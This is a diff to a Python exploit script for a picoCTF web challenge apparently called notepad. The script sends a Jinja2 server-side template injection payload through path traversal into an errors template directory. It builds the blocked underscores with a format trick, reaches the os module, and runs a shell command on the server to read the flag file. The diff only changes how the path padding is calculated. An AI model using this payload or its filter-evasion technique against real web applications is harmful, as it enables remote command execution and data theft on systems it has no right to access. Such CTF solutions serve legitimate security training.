@@ -7,9 +7,10 @@ url = "https://notepad.mars.picoctf.net/"
 s = requests.Session()
 
 # inject
-payload = '''../templates/errors/{{cycler["%c%cinit%c%c"|format(95,95,95,95)]["%c%cglobals%c%c"|format(95,95,95,95)]['os'].popen('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}'''
+dir = "../templates/errors/"
+payload = dir + "{{cycler['%c%cinit%c%c'|format(95,95,95,95)]['%c%cglobals%c%c'|format(95,95,95,95)]['os'].popen('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}"
 
-for i in range(54):
+for i in range((128 - len(dir)) // 2):
     payload = './' + payload
 
 res = s.post(f'{url}/new', data={"content": payload.replace("/", "\\")})
